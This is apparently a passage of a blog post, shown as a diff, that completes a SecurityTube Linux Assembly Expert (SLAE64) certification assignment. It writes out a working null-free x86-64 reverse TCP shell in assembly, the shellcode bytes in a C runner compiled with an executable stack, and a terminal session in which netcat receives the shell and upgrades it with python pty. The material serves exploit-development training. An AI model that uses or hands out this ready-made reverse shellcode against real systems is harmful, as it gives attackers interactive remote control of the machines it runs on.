@@ -73,3 +73,184 @@ Disassembly of section .text:
 whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B/og$
 ```
 
+Similarly like in the prior Assignment, most of the NULL opcodes arise from MOV operations, moving small values into rather big registers (I.E performing a MOV operation against 
+the value "1" into RSI). In order to prevent such values, Lower bit Registers can be used. For instance, instead of using RAX when incrementing the register, AL could be used 
+instead, which performs the same operation, with no NULLs whatsoever. In addition, a similar operation could be incrementing the register by one.
+
+Final code:
+
+```term
+global _start
+
+
+_start:
+
+	; sock = socket(AF_INET, SOCK_STREAM, 0)
+	; AF_INET = 2
+	; SOCK_STREAM = 1
+	; syscall number 41
+
+
+        xor rax, rax
+        xor rdi, rdi
+        xor rsi, rsi
+        xor rdx, rdx
+
+	mov al, 41
+
+        inc rdi
+        inc rdi
+
+        inc rsi
+
+	syscall
+
+	; copy socket descriptor to rdi for future use
+
+	mov rdi, rax
+
+
+	; server.sin_family = AF_INET
+	; server.sin_port = htons(PORT)
+	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
+	; bzero(&server.sin_zero, 8)
+
+	xor rdx, rdx
+        xor rbp, rbp
+
+        push word 0x2
+        pop bp
+
+	push rdx
+
+	mov dword [rsp-4], 0x0101017f
+	mov word [rsp-6], 0x5c11
+	mov word [rsp-8], bp
+	sub rsp, 8
+
+	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
+
+	mov al, 42
+	mov rsi, rsp
+	mov dl, 16
+	syscall
+
+
+        ; duplicate sockets
+
+        ; dup2 (new, old)
+
+	mov al, 33
+
+        xor rsi, rsi
+
+        syscall
+
+        mov al, 33
+
+        inc rsi
+
+        syscall
+
+        mov al, 33
+
+        inc rsi
+
+        syscall
+
+
+        ; execve
+
+        ; First NULL push
+
+        xor rax, rax
+        push rax
+
+        ; push /bin//sh in reverse
+
+        mov rbx, 0x68732f2f6e69622f
+        push rbx
+
+        ; store /bin//sh address in RDI
+
+        mov rdi, rsp
+
+        ; Second NULL push
+        push rax
+
+        ; set RDX
+        mov rdx, rsp
+
+
+        ; Push address of /bin//sh
+        push rdi
+
+        ; set RSI
+
+        mov rsi, rsp
+
+        ; Call the Execve syscall
+        add rax, 59
+        syscall
+```
+
+Let's assemble, link this and get its shellcode!
+
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d 1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+```
+
+###### C format
+
+```term
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb0\x29\x48\xff\xc7\x48\xff\xc7\x48\xff\xc6\x0f\x05\x48\x89\xc7\x48\x31\xd2\x48\x31\xed\x66\x6a\x02\x66\x5d\x52\xc7\x44\x24\xfc
+\x7f\x01\x01\x01\x66\xc7\x44\x24\xfa\x11\x5c\x66\x89\x6c\x24\xf8\x48\x83\xec\x08\xb0\x2a\x48\x89\xe6\xb2\x10\x0f\x05\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\xb0\
+x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
+
+;
+
+main()
+{
+ 
+printf("Shellcode Length:  %d\n", (int)strlen(code));
+ 
+int (*ret)() = (int(*)())code;
+ 
+ret();
+ 
+}
+```
+
+#### EndGame
+
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ gcc reverse-null-free.c -o reverse-null-free -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_2/B$ ./reverse-null-free 
+Shellcode Length:  126
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+whitecr0wz@SLAE64:~$ nc -lvp 4444 
+listening on [any] 4444 ...
+connect to [127.1.1.1] from localhost [127.0.0.1] 40484
+id
+uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+pwd
+/home/whitecr0wz/assembly/assignments/Assignment_2/B
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2/B$ id 
+id 
+uid=1000(whitecr0wz) gid=1000(whitecr0wz) groups=1000(whitecr0wz),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+whitecr0wz@SLAE64:/home/whitecr0wz/assembly/assignments/Assignment_2/B$
+```
+
+### Code
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
+courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
+
+Student ID: SLAE64–27812/PA-27812
+
+You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_2/B).
